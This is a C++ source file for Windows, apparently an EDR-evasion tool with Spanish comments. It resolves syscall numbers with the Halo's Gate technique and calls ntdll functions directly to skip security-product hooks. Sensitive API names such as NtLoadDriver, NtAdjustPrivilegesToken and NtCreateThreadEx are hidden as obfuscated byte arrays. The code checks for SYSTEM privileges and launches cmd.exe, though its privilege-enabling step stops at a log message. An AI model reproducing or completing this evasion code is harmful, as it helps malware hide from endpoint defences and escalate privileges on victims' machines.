// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>
#include <string>

#include <namedpipeapi.h>
#include <tlhelp32.h>
#include <winternl.h>

#include "DefsModule.h"


/*
*
* Ahora introduciremos el halo's gate
*
*/

extern "C" {

    EXTERN_C PVOID getntdll();

    EXTERN_C PVOID getExportTable(
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExAddressTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExNamePointerTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExOrdinalTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getApiAddr(
        IN DWORD apiNameStringLen,
        IN LPSTR apiNameString,
        IN PVOID moduleAddr,
        IN PVOID ExExAddressTable,
        IN PVOID ExNamePointerTable,
        IN PVOID ExOrdinalTable
    );

    EXTERN_C DWORD findSyscallNumber(
        IN PVOID ntdllApiAddr
    );

    EXTERN_C DWORD halosGate(
        IN PVOID ntdllApiAddr,
        IN WORD index
    );

    EXTERN_C DWORD compExplorer(
        IN PVOID explorerWString
    );

    EXTERN_C WORD halosGateUp(PVOID addr, DWORD index);

    EXTERN_C WORD halosGateDown(PVOID addr, DWORD index);

    EXTERN_C VOID SetCall(WORD CallValue);
    EXTERN_C NTSTATUS CallFunc(...);
}

// =====================================================
#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)


#define LOG_OK(fmt, ...)\
    print("[+] " fmt, ##__VA_ARGS__)

#define LOG_ERROR(fmt, ...)\
    print("[-] " fmt, ##__VA_ARGS__)

#define LOG_WARNING(fmt, ...)\
    print("[!] " fmt, ##__VA_ARGS__)

#define LOG_INFO(fmt, ...)\
    print("[*] " fmt, ##__VA_ARGS__)

// ======================================================

PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}


PVOID ntdllAddr = NULL;

PVOID ntdllExportTable = NULL;

PVOID ntdllExAddrTbl = NULL;

PVOID ntdllExNamePtrTbl = NULL;

PVOID ntdllExOrdinalTbl = NULL;


char letters[] = {
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', ':', '\\', '-',
};

// ====================================

BYTE nAllocMem[] = {
    39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};


BYTE nProtectMem[] = {
    39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};

BYTE nCreateTh[] = {
    39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23
};
BYTE nWaitObj[] = {
    39, 19, 48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19
};

BYTE nFreeMem[] = {
    39, 19, 31, 17, 4, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};

// NtOpenKey
BYTE nOpenKey[] =
{
    39, 19, 40, 15, 4, 13, 36, 4, 24
};

// NtCreateKey
BYTE nCreateKey[] = {
    39, 19, 28, 17, 4, 0, 19, 4, 36, 4, 24
};

// NtSetValueKey
BYTE nSetKeyVal[] = {
    39, 19, 44, 4, 19, 47, 0, 11, 20, 4, 36, 4, 24
};

// NtOpenProcessToken
BYTE nOpenToken[] = {
    39, 19, 40, 15, 4, 13, 41, 17, 14, 2, 4, 18, 18, 45, 14, 10, 4, 13
};

// NtAdjustPrivilegesToken
BYTE nAdjustPrivs[] = {
    39, 19, 26, 3, 9, 20, 18, 19, 41, 17, 8, 21, 8, 11, 4, 6, 4, 18, 45, 14, 10, 4, 13
};

// NtLoadDriver
BYTE nLoadDriver[] = {
    39, 19, 37, 14, 0, 3, 29, 17, 8, 21, 4, 17
};

// NtUnloadDriver
BYTE nUnloadDriver[] = {
    39, 19, 46, 13, 11, 14, 0, 3, 29, 17, 8, 21, 4, 17
};

// NtQueryValueKey
BYTE nQueryKeyVal[] = {
    39, 19, 42, 20, 4, 17, 24, 47, 0, 11, 20, 4, 36, 4, 24
};

// NtQuerySystemInformation
BYTE nQuerySysInfo[] = {
    39, 19, 42, 20, 4, 17, 24, 44, 24, 18, 19, 4, 12, 34, 13, 5, 14, 17, 12, 0, 19, 8, 14, 13
};

// NtDeviceIoControlFile
BYTE nDeviceIoControl[] =
{
    39, 19, 29, 4, 21, 8, 2, 4, 34, 14, 28, 14, 13, 19, 17, 14, 11, 31, 8, 11, 4
};

// NtCreateFile
BYTE nCreateFile[] =
{
    39, 19, 28, 17, 4, 0, 19, 4, 31, 8, 11, 4
};

// NtQueryInformationToken
BYTE nQueryInfoTkn[] =
{
    39, 19, 42, 20, 4, 17, 24, 34, 13, 5, 14, 17, 12, 0, 19, 8, 14, 13, 45, 14, 10, 4, 13
};

// =====================================

// ntoskrnl.exe
//BYTE nNtosModule[] = {
//    13, 19, 14, 18, 10, 17, 13, 11, 62, 4, 23, 4
//};
//
//BYTE nPsInitialSysProc[] =
//{
//    41, 18, 34, 13, 8, 19, 8, 0, 11, 44, 24, 18, 19, 4, 12, 41, 17, 14, 2, 4, 18, 18
//};

// =====================================

// C:\Windows\system32\cmd.exe
BYTE pathCmd[] =
{
    28, 63, 64, 48, 8, 13, 3, 14, 22, 18, 64, 18, 24, 18, 19, 4, 12, 54, 53, 64, 2, 12, 3, 62, 4, 23, 4
};

// "Advapi32.dll"
BYTE mdlAvp[] =
{
    26, 3, 21, 0, 15, 8, 54, 53, 62, 3, 11, 11
};

// GetTokenInformation
BYTE nGetTknInfo[] = {
    32, 4, 19, 45, 14, 10, 4, 13, 34, 13, 5, 14, 17, 12, 0, 19, 8, 14, 13
};

// ConvertSidToStringSidA
BYTE nCnvrtSidToStr[] = {
    28, 14, 13, 21, 4, 17, 19, 44, 8, 3, 45, 14, 44, 19, 17, 8, 13, 6, 44, 8, 3, 26
};

// S-1-5-18
BYTE magic_number[] =
{
    44, 65, 52, 65, 56, 65, 52, 59
};

// =====================================

PTEB GetEnvironmentThreadBlock()
{
	return (PTEB)__readgsqword(0x30);
}

VOID getWord(char* dst, PBYTE clave, SIZE_T size)
{
    for (size_t i = 0; i < size; i++)
    {
        dst[i] = letters[clave[i]];
    }
}

BOOL init_program()
{

    ntdllAddr = getntdll();

    if (!ntdllAddr)
    {
        LOG_ERROR("Direccion no encontrada ntdllAddr");
        return FALSE;
    }

    ntdllExportTable = getExportTable(ntdllAddr);

    if (!ntdllExportTable)
    {
        LOG_ERROR("Direccion no encontrada ntdllExportTable");
        return FALSE;
    }

    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExAddrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExAddrTbl");
        return FALSE;
    }

    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExNamePtrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExNamePtrTbl");
        return FALSE;
    }

    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdllAddr);


    if (!ntdllExOrdinalTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExOrdinalTbl");
        return FALSE;
    }

    return TRUE;
}

BOOL get_numSys(pfunStruct structFunction)
{
    if (!ntdllAddr || !ntdllExAddrTbl || !ntdllExNamePtrTbl || !ntdllExOrdinalTbl || !structFunction->name)
    {
        return FALSE;
    }

    size_t strSize = structFunction->size;

    if (strSize > 127)
    {
        LOG_ERROR("El tamano del nombre de la funcion es demasiado grande");
        return FALSE;
    }

    char fn[127] = { 0 };

    for (size_t i = 0; i < strSize; i++)
    {
        fn[i] = letters[structFunction->name[i]];
    }

    LOG_INFO("Funcion a buscar: %s", fn);

    PVOID addr = getApiAddr(
        strSize,
        fn,
        ntdllAddr,
        ntdllExAddrTbl,
        ntdllExNamePtrTbl,
        ntdllExOrdinalTbl
    );

    WORD number = findSyscallNumber(addr);

    if (number)
    {
        LOG_OK("Valor de numerico de %s es %d", fn, number);
        structFunction->sysnum = number;
        return TRUE;
    }

    DWORD index = 0;

    while (number == 0) {
        index++;

        number = halosGateUp(addr, index);

        if (number) {
            number = number - index;
            break;
        }

        number = halosGateDown(addr, index);

        if (number) {
            number = number + index;
            break;
        }
    }

    LOG_OK("Valor de numerico de %s es %d", fn, number);
    structFunction->sysnum = number;

    return TRUE;
}

BOOL CharToWChar(
    const char* src,
    WCHAR* dst,
    size_t dstSize)
{
    if (!src || !dst || dstSize == 0)
        return FALSE;

    int ret = MultiByteToWideChar(
        CP_ACP,            
        0,
        src,
        -1,                
        dst,
        (int)dstSize);

    return (ret != 0);
}

HMODULE GetModuleBaseFromPEB(PBYTE moduleBytes, SIZE_T size) {
    PTEB pCurrentTeb = GetEnvironmentThreadBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    PEB_LDR_DATA* ldr = pCurrentPeb->Ldr;
    PLIST_ENTRY listHead = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = listHead->Flink;

    char string_to_get[256] = { 0 };
    WCHAR moduleName[256] = { 0 };

    getWord(string_to_get, moduleBytes, size);

    LOG_INFO("Module to Load: %s", string_to_get);

    if (!CharToWChar(string_to_get, moduleName, _countof(moduleName))) {
        return NULL;
    }

    LOG_INFO("Module Name after convert: %ls", moduleName);

    while (entry != listHead) {
        PLDR_DATA_TABLE_ENTRY_ALTERNATIVE ldrEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_ALTERNATIVE, InMemoryOrderLinks);
        if (ldrEntry->BaseDllName.Buffer != NULL) {
            // Comparar el nombre de la DLL (case insensitive)
            if (_wcsicmp(ldrEntry->BaseDllName.Buffer, moduleName) == 0) {
                return (HMODULE)ldrEntry->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return NULL;
}

FARPROC GetProcAddressFromExportTable(HMODULE moduleBase, PBYTE byteFunction, SIZE_T byteSize) {

    char functionName[256] = { 0 };

    getWord(functionName, byteFunction, byteSize);

    LOG_INFO("Funcion a buscar: %s", functionName);

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return NULL;

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + exportDirRVA);

    DWORD* names = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* currentName = (char*)((BYTE*)moduleBase + names[i]);
        if (strcmp(currentName, functionName) == 0) {
            return (FARPROC)((BYTE*)moduleBase + functions[ordinals[i]]);
        }
    }
    return NULL;
}

//=================================================================

BOOL IsRunningAsSystem()
{

    HANDLE hToken = NULL;

    BOOL bResult = FALSE;

    funStruct sOpenTknProc;
    sOpenTknProc.name = nOpenToken;
    sOpenTknProc.size = sizeof(nOpenToken);

    if (!get_numSys(&sOpenTknProc))
    {
        return FALSE;
    }

    NTSTATUS status;

    HANDLE process = GetCurrentProcess();

    SetCall(sOpenTknProc.sysnum);
    status = CallFunc(process, TOKEN_QUERY, &hToken);

    if (!NT_SUCCESS(status)) {
        LOG_ERROR("No se obtuvo token");
        return FALSE;
    }

    funStruct sQueryInfoTkn;
    sQueryInfoTkn.name = nQueryInfoTkn;
    sQueryInfoTkn.size = sizeof(nQueryInfoTkn);

    if (!get_numSys(&sQueryInfoTkn))
    {
        return FALSE;
    }

    DWORD dwSize = 0;

    SetCall(sQueryInfoTkn.sysnum);
    status = CallFunc(hToken, TokenUser, NULL, 0, &dwSize);

    if (dwSize == 0)
    {
        LOG_ERROR("Error en Query Info Token: 0x%08x", status);
        CloseHandle(hToken);
        return FALSE;
    }

    PTOKEN_USER pTknUsr = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, dwSize);

    if (!pTknUsr) {
        CloseHandle(hToken);
        return FALSE;
    }

    SetCall(sQueryInfoTkn.sysnum);
    status = CallFunc(hToken, TokenUser, pTknUsr, dwSize, &dwSize);

    if (status != 0)
    {
        LOG_ERROR("Error en Query Info Token: 0x%08x", status);
    }

    PSID pSid = pTknUsr->User.Sid;

    unsigned char systemSidBinary[] = {
        0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x12, 0x00, 0x00, 0x00
    };

    if (pSid) {
        
        if (memcmp(pSid, systemSidBinary, sizeof(systemSidBinary)) == 0) {
            LOG_INFO("Corriendo en System");
            bResult = TRUE;
        }
    }

    HeapFree(GetProcessHeap(), 0, pTknUsr);
    CloseHandle(hToken);

    return bResult;
}

//=================================================================

// Entry Point
int main()
{

    LOG_INFO("Iniciando programa");

    if (!init_program())
    {
        return -1;
    }

    // Now get the tkn 
    HANDLE hProcess = NULL, hToken = NULL, hTokenDuplicate = NULL;

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    CHAR command[256] = { 0 };

    getWord(command, pathCmd, sizeof(pathCmd));

    LOG_INFO("Revisando permisos");

    if (IsRunningAsSystem())
    {
        LOG_INFO("Ya estamos cirrendo en SYSTEM!");
        LOG_INFO("Spawning cmd.exe");

        system("cmd.exe");
        return 0;
    }

    LOG_INFO("Habilitando Privs");

    return 0;

}